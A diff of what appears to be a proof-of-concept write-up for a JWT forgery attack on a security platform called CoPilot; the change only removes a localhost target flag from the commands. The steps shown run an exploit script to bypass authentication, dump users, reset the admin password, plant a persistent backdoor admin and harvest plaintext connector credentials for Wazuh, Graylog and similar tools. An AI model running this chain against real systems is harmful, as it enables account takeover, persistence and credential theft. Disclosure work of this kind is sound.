@@ -72,7 +72,7 @@ token = jwt.encode({"sub": "admin", "scopes": ["admin"], "exp": int(time.time())
 ### Step 2 — Confirm authentication bypass
 
 ```
-python 01_jwt_forgery.py dump-users --target http://localhost:5000
+python 01_jwt_forgery.py dump-users
 
 [+] Dumping user accounts (/api/auth/users) ...
   [OK] HTTP 200  user list
@@ -84,7 +84,7 @@ python 01_jwt_forgery.py dump-users --target http://localhost:5000
 ### Step 3 — Take over the admin account (password reset, no current password required)
 
 ```
-python 01_jwt_forgery.py reset-password --target http://localhost:5000
+python 01_jwt_forgery.py reset-password
 
 [+] Resetting password for user 'admin' ...
   [OK] HTTP 200  password reset
@@ -96,7 +96,7 @@ python 01_jwt_forgery.py reset-password --target http://localhost:5000
 ### Step 4 — Plant persistent backdoor admin account
 
 ```
-python 01_jwt_forgery.py add-admin --target http://localhost:5000
+python 01_jwt_forgery.py add-admin
 ```
 
 The backdoor account is stored in the database and survives JWT secret rotation. After rotation, the attacker re-authenticates legitimately via `/api/auth/token` using the planted credentials.
@@ -104,7 +104,7 @@ The backdoor account is stored in the database and survives JWT secret rotation.
 ### Step 5 — Harvest connector credentials
 
 ```
-python 01_jwt_forgery.py dump-connectors --target http://localhost:5000
+python 01_jwt_forgery.py dump-connectors
 ```
 
 CoPilot stores credentials for all integrated tools in plaintext in the database. These are returned directly by `/api/connectors` with an admin-scoped token. Affected integrations include Wazuh, Graylog, DFIR-IRIS, Cortex, and Velociraptor — each of which typically holds admin-level access to the tools it manages.
@@ -114,7 +114,7 @@ CoPilot stores credentials for all integrated tools in plaintext in the database
 ## Full Attack Chain (single command)
 
 ```
-python 01_jwt_forgery.py chain --target http://localhost:5000
+python 01_jwt_forgery.py chain
 ```
 
 Executes all steps sequentially: auth bypass confirmation → credential harvest → backdoor creation → admin password reset.
